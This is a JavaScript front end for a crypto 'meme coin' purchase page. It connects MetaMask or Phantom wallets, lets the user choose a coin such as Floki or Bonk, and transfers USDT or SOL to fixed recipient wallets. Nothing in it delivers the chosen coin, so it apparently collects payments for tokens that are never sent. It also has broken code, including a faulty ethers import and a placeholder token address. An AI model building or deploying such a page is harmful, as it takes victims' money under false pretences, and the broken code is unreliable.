// Load ethers from global if available
const { ethers } = typeof window !== 'undefined' && window.ethers ? window.ethers : null;

// Use the correct SolanaWeb3 reference for CDN/IIFE usage
const SolanaWeb3 = window.solanaWeb3;
const solanaProvider = window.solana || null;

const solanaRecipientAddress = '2dwB5Gm8cdeLGjC9gagdbU14wntHww5gx6bPzUScyYFq';
const recipientAddressEth = '0x447150676d5c704A6a89B4d263DA1D245A9FB83A';
const recipientAddressBsc = '0x447150676d5c704A6a89B4d263DA1D245A9FB83A';

const usdtAddressEth = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const usdtAddressBsc = '0x55d398326f99059fF775485246999027B3197955';

const allMemeCoins = [
  { name: 'Floki', image: 'floki.png', addressEth: '0xcf0c122c6b73ff809c693db761e7baebe62b6a2e', addressBsc: '0xfb5b838b6cfeedc2873ab27866079ac55363d37e', decimalsEth: 9, decimalsBsc: 9, symbol: 'FLOKI' },
  { name: 'Ice Network', image: 'ice-network.png', addressEth: '0x79F05c263055BA20EE0e814ACD117C20CAA10e0c', addressBsc: '0xc335df7c25b72eec661d5aa32a7c2b7b2a1d1874', decimalsEth: 18, decimalsBsc: 18, symbol: 'ICE' },
  { name: 'LUNC', image: 'lunc.png', addressEth: '0xbd31ea8212119f94a611fa969881cba3ea06fa3d', addressBsc: '0x156ab3346823B651294766e23e6Cf87254d68962', decimalsEth: 6, decimalsBsc: 6, symbol: 'LUNA' },
  { name: 'Bonk', image: 'bonk.png', addressEth: '0x1151CB3d861920e07a38e03eEAd12C32178567F6', addressBsc: '0xA697e272a73744b343528C3Bc4702F2565b2F422', decimalsEth: 5, decimalsBsc: 5, symbol: 'BONK' },
  { name: 'Shiba-Inu', image: 'shiba-inu.png', addressEth: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', addressBsc: '0xPLACEHOLDER', decimalsEth: 18, decimalsBsc: 18, symbol: 'SHIB' },
  { name: 'Doge', image: 'doge.png', addressEth: null, addressBsc: '0xba2ae424d960c26247dd6c32edc70b295c744c43', decimalsEth: 8, decimalsBsc: 8, symbol: 'DOGE' }
];

let memeCoins = [];
let selectedCoin = null;

const updateAmountLimits = () => {
  let min, max, label;
  const currency = document.getElementById("currency").textContent;
  if (currency === "SOL") {
    min = 0.5;
    max = 625;
    label = "Enter amount (Min: 0.5 SOL, Max: 625 SOL):";
    document.getElementById("paymentAmount").step = "0.01";
  } else {
    min = 50;
    max = 100000;
    label = "Enter amount (Min: $50, Max: $100,000):";
    document.getElementById("paymentAmount").step = "0.01";
  }
  document.getElementById("paymentAmount").min = min;
  document.getElementById("paymentAmount").max = max;
  document.getElementById("amountLimits").textContent = label;
};

const connectSolanaWallet = async () => {
  if (solanaProvider && solanaProvider.isPhantom) {
    try {
      const resp = await solanaProvider.connect();
      document.getElementById("status").textContent = `Connected to Solana: ${resp.publicKey.toString()}`;
      document.getElementById("currency").textContent = "SOL";
      memeCoins = allMemeCoins.filter(coin => coin.name === 'Bonk');
      displayMemeCoins();
      document.getElementById("walletButtons").classList.add("hidden");
      document.getElementById("coinSelection").classList.remove("hidden");
      document.getElementById("introSection")?.classList.add("hidden");
      document.getElementById("backers")?.classList.add("hidden");
      updateAmountLimits();
    } catch (err) {
      console.error("Solana connection error:", err);
    }
  } else {
    alert("Phantom Wallet not found.");
  }
};

const connectWallet = async () => {
  if (!window.ethereum) {
    document.getElementById("status").textContent = "MetaMask not detected. Please install MetaMask.";
    return;
  }

  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const chainId = await provider.getNetwork().then(net => net.chainId);

    if (chainId === 1) {
      document.getElementById("status").textContent = "Connected to Ethereum";
      document.getElementById("currency").textContent = "USDT";
      memeCoins = allMemeCoins.filter(coin => ['Floki', 'Ice Network', 'LUNC', 'Bonk', 'Shiba-Inu'].includes(coin.name));
    } else if (chainId === 56) {
      document.getElementById("status").textContent = "Connected to BSC";
      document.getElementById("currency").textContent = "USDT";
      memeCoins = allMemeCoins.filter(coin => ['Floki', 'Ice Network', 'LUNC', 'Bonk', 'Doge'].includes(coin.name));
    } else {
      document.getElementById("status").textContent = "Unsupported network. Switch to Ethereum or BSC.";
      return;
    }

    document.getElementById("walletButtons").classList.add("hidden");
    document.getElementById("coinSelection").classList.remove("hidden");
    document.getElementById("introSection")?.classList.add("hidden");
    document.getElementById("backers")?.classList.add("hidden");
    displayMemeCoins();
    updateAmountLimits();
  } catch (error) {
    document.getElementById("status").textContent = `Connection failed: ${error.message}`;
  }
};

const displayMemeCoins = () => {
  const container = document.getElementById("coinOptions");
  container.innerHTML = '';
  memeCoins.forEach(coin => {
    const div = document.createElement("div");
    div.className = "coin-option";
    div.innerHTML = `<img src="${coin.image}" alt="${coin.name}"><p>${coin.name}</p>`;
    div.addEventListener("click", (event) => selectCoin(coin, event));
    container.appendChild(div);
  });
};

const selectCoin = (coin, event) => {
  document.querySelectorAll(".coin-option").forEach(option => option.classList.remove("selected"));
  event.currentTarget.classList.add("selected");
  document.getElementById("coinSelection").classList.add("hidden");
  document.getElementById("paymentSection").classList.remove("hidden");
  document.getElementById("selectedCoin").textContent = coin.name;
  selectedCoin = coin;
  updateAmountLimits();
};

const payNow = async () => {
  const amount = parseFloat(document.getElementById("paymentAmount").value);
  const currency = document.getElementById("currency").textContent;
  let min, max, errorMsg;
  if (currency === "SOL") {
    min = 0.5;
    max = 625;
    errorMsg = "Amount must be between 0.5 and 625 SOL.";
  } else {
    min = 50;
    max = 100000;
    errorMsg = "Amount must be between $50 and $100,000.";
  }
  if (!amount || amount < min || amount > max) {
    document.getElementById("paymentStatus").textContent = errorMsg;
    return;
  }

  if (window.ethereum && ethers && currency === "USDT") {
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const chainId = await provider.getNetwork().then(net => net.chainId);
      const usdtAddress = chainId === 1 ? usdtAddressEth : usdtAddressBsc;
      const recipient = chainId === 1 ? recipientAddressEth : recipientAddressBsc;

      const usdt = new ethers.Contract(usdtAddress, [
        "function decimals() view returns (uint8)",
        "function balanceOf(address) view returns (uint256)",
        "function transfer(address, uint256) returns (bool)"
      ], signer);

      const decimals = await usdt.decimals();
      const value = ethers.utils.parseUnits(amount.toString(), decimals);
      const balance = await usdt.balanceOf(await signer.getAddress());

      if (balance.lt(value)) {
        document.getElementById("paymentStatus").textContent = "Insufficient USDT balance.";
        return;
      }

      const tx = await usdt.transfer(recipient, value);
      await tx.wait();

      document.getElementById("paymentStatus").textContent = `Success! Tx: ${tx.hash}`;
      document.getElementById("resetButton").classList.remove("hidden");
    } catch (err) {
      document.getElementById("paymentStatus").textContent = `Error: ${err.message}`;
    }
    return;
  }

  if (solanaProvider && SolanaWeb3 && currency === "SOL") {
    try {
      const connection = new SolanaWeb3.Connection("https://api.mainnet-beta.solana.com");
      const from = solanaProvider.publicKey;
      const to = new SolanaWeb3.PublicKey(solanaRecipientAddress);

      const transaction = new SolanaWeb3.Transaction().add(
        SolanaWeb3.SystemProgram.transfer({
          fromPubkey: from,
          toPubkey: to,
          lamports: amount * SolanaWeb3.LAMPORTS_PER_SOL
        })
      );

      transaction.feePayer = from;
      transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

      const signed = await solanaProvider.signTransaction(transaction);
      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig);

      document.getElementById("paymentStatus").textContent = `Success! Tx: ${sig}`;
      document.getElementById("resetButton").classList.remove("hidden");
    } catch (err) {
      document.getElementById("paymentStatus").textContent = `Solana error: ${err.message}`;
    }
    return;
  }

  document.getElementById("paymentStatus").textContent = "No wallet connected.";
};

const resetApp = () => {
  document.getElementById("walletButtons").classList.remove("hidden");
  document.getElementById("coinSelection").classList.add("hidden");
  document.getElementById("paymentSection").classList.add("hidden");
  document.getElementById("status").textContent = "Status: Click to connect your wallet";
  document.getElementById("paymentStatus").textContent = '';
  document.getElementById("resetButton").classList.add("hidden");
  document.getElementById("paymentAmount").value = '';
  document.getElementById("introSection")?.classList.remove("hidden");
  document.getElementById("backers")?.classList.remove("hidden");
  updateAmountLimits();
};

// Video setup
const youtubeLink = 'https://www.youtube.com/watch?v=OH4oOYIULlE';
const videoId = youtubeLink.split('v=')[1]?.split('&')[0];
document.getElementById("video-container").innerHTML = `
  <iframe width="560" height="315" src="https://www.youtube.com/embed/${videoId}" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
`;

// Event bindings
document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("connectEvmWallet").addEventListener("click", connectWallet);
  document.getElementById("connectSolanaWallet").addEventListener("click", connectSolanaWallet);
  document.getElementById("payButton").addEventListener("click", payNow);
  document.getElementById("resetButton").addEventListener("click", resetApp);
  updateAmountLimits();
});
